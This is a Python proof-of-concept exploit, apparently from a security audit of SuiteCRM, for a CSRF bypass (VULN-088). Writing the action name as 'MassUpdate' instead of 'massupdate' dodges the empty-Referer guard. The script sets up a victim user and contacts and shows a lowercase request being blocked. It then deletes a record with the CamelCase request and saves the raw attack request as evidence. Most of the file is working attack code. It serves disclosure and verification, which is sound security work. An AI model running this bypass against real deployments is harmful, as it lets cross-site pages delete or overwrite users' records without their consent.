#!/usr/bin/env python3
"""
VULN-088 — Action-name case-normalization mismatch defeats the CSRF referer guard
=================================================================================

Location : include/MVC/SugarApplication.php:516   (raw-case in_array in isModifyAction())
           vs include/MVC/Controller/SugarController.php:254 (raw store) & :595 (strtolower dispatch)
Class    : CWE-352 (CSRF) + CWE-178 (improper case handling)

Plain-English flaw
------------------
SuiteCRM dispatches actions case-insensitively (`action_` . strtolower($action)),
but its CSRF classifier `isModifyAction()` compares the *raw-case* action name
against all-lowercase lists (`globalModifyActions = ['massupdate','quicksave',...]`).
The app's own canonical action names are CamelCase (`MassUpdate`, `QuickSave`,
`configureDashlet`). So `in_array('MassUpdate', ['massupdate',...])` is FALSE:
these actions are never classified as "modify actions", and the empty-Referer
CSRF rejection in `checkHTTPReferer()` (which only fires for modify actions) is
silently skipped — while the request still dispatches to `action_massupdate()`.

Exploitation idea
-----------------
Fire the SAME functional action twice from an authenticated session with NO
Referer header (simulating a cross-site auto-submitting POST form):
  * lowercase `action=massupdate`  -> classified as modify -> guard fires -> BLOCKED (xsrf.tpl)
  * CamelCase `action=MassUpdate`   -> not classified       -> guard skipped -> mass-delete SUCCEEDS
The differential proves the case mismatch nullifies the CSRF control. An admin
victim with `entire=true` would delete every record in a module.

What a successful run proves
----------------------------
An attacker page that suppresses the Referer can drive an authenticated victim's
browser to mass-delete/overwrite records via the CamelCase action, bypassing the
referer-based CSRF defense the developers intended to apply. Demonstrated by
deleting a record via `MassUpdate` (no Referer) while an identical `massupdate`
request is blocked by the guard.
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                     admin_session, create_user, web_login, rest_login, rest_call)

LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")


def main():
    banner("VULN-088", "Action-name case mismatch defeats CSRF referer guard (MassUpdate)")
    log("INFO", "isModifyAction() raw-case in_array (SugarApplication.php:516) vs strtolower dispatch (SugarController.php:595)")

    # --- SETUP: a victim user + two disposable Contacts the victim owns ---------
    log("SETUP", "admin creates a disposable victim user; the CSRF acts as this authenticated victim")
    adm = admin_session()
    victim = create_user(adm, LOWPRIV_PASS)
    s = web_login(victim["user_name"], victim["password"])
    sid = rest_login(victim["user_name"], victim["password"])
    tag = rand("csrf")

    def make_contact(suffix):
        r = rest_call("set_entry", [sid, "Contacts",
                                    [{"name": "last_name", "value": f"{tag}_{suffix}"},
                                     {"name": "assigned_user_id", "value": victim["id"]}]])
        return r.get("id")

    id_block = make_contact("block")    # targeted by the lowercase (guarded) request
    id_bypass = make_contact("bypass")  # targeted by the CamelCase (bypassing) request
    log("SETUP", f"seeded 2 Contacts owned by victim: block={id_block} bypass={id_bypass}")

    def contact_alive(cid):
        """True if the contact is still a live (non-deleted) row, via the app's API."""
        r = rest_call("get_entry_list", [sid, "Contacts", f"contacts.id = '{cid}'", "", 0,
                                         ["id", "deleted"], [], 2, 0])
        return bool(r.get("entry_list"))   # get_entry_list excludes deleted rows

    def mass_delete(action, cid):
        """POST a mass-delete for one record with NO Referer (cross-site CSRF simulation)."""
        data = {"module": "Contacts", "action": action, "massupdate": "true",
                "uid": cid, "Delete": "true",
                "return_module": "Contacts", "return_action": "index",
                "current_query_by_page": "{}"}
        # deliberately NO Referer header -> $_SERVER['HTTP_REFERER'] empty (the cross-site case)
        r = s.post(f"{BASE_URL}/index.php", data=data, allow_redirects=False, timeout=60)
        blocked = ("xsrf" in r.text.lower() or "possible attempt" in r.text.lower()
                   or "cross site" in r.text.lower() or "not a valid" in r.text.lower())
        return r.status_code, blocked, r.text

    # --- STEP 1: lowercase action -> guard MUST fire (control) -------------------
    log("STEP", "control: POST action=massupdate (lowercase, classified modify) with NO Referer -> guard should BLOCK")
    st1, blocked1, body1 = mass_delete("massupdate", id_block)
    log("PROOF", f"lowercase massupdate: HTTP {st1}, csrf-guard-blocked={blocked1}")

    # --- STEP 2: CamelCase action -> guard skipped (the bug) ---------------------
    log("STEP", "attack: POST action=MassUpdate (CamelCase, NOT classified) with NO Referer -> guard should be SKIPPED")
    st2, blocked2, body2 = mass_delete("MassUpdate", id_bypass)
    log("PROOF", f"CamelCase MassUpdate: HTTP {st2}, csrf-guard-blocked={blocked2}")

    time.sleep(1)
    alive_block = contact_alive(id_block)
    alive_bypass = contact_alive(id_bypass)
    log("PROOF", f"post-state: block-contact alive={alive_block} (guard held) | bypass-contact alive={alive_bypass} (should be deleted)")

    # evidence
    d = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(d, "request.http"), "w") as f:
        f.write("### CamelCase bypass request (no Referer) — the CSRF payload a cross-site form would POST\n"
                "POST /index.php HTTP/1.1\r\nHost: localhost:33116\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=<victim session>\r\n"
                "(NO Referer header)\r\n\r\n"
                f"module=Contacts&action=MassUpdate&massupdate=true&uid={id_bypass}&Delete=true"
                "&return_module=Contacts&return_action=index&current_query_by_page=%7B%7D\r\n")
    with open(os.path.join(d, "response.txt"), "w") as f:
        f.write(f"### lowercase massupdate (guarded) -> HTTP {st1} blocked={blocked1}\n{body1[:900]}\n\n"
                f"### CamelCase MassUpdate (bypass) -> HTTP {st2} blocked={blocked2}\n{body2[:400]}\n")
    with open(os.path.join(d, "evidence", "result.txt"), "w") as f:
        f.write(f"lowercase_massupdate: http={st1} guard_blocked={blocked1} block_contact_alive_after={alive_block}\n"
                f"CamelCase_MassUpdate: http={st2} guard_blocked={blocked2} bypass_contact_alive_after={alive_bypass}\n")

    # --- verdict: the guard must fire for lowercase and NOT for CamelCase, and the
    #     CamelCase delete must actually have removed the record ------------------
    if blocked1 and not blocked2 and alive_block and not alive_bypass:
        log("OK", "exploit confirmed — identical action, but CamelCase 'MassUpdate' with no Referer "
                  "bypassed the CSRF guard that blocked lowercase 'massupdate', and deleted the record")
        verdict("VULN-088", "CONFIRMED",
                "CamelCase MassUpdate bypasses the empty-Referer CSRF guard -> cross-site mass delete")
        sys.exit(0)
    log("FAIL", f"expected block1=True block2=False alive_block=True alive_bypass=False; "
               f"got {blocked1},{blocked2},{alive_block},{alive_bypass}")
    verdict("VULN-088", "FAILED", "did not observe the guard bypass differential")
    sys.exit(1)


if __name__ == "__main__":
    main()
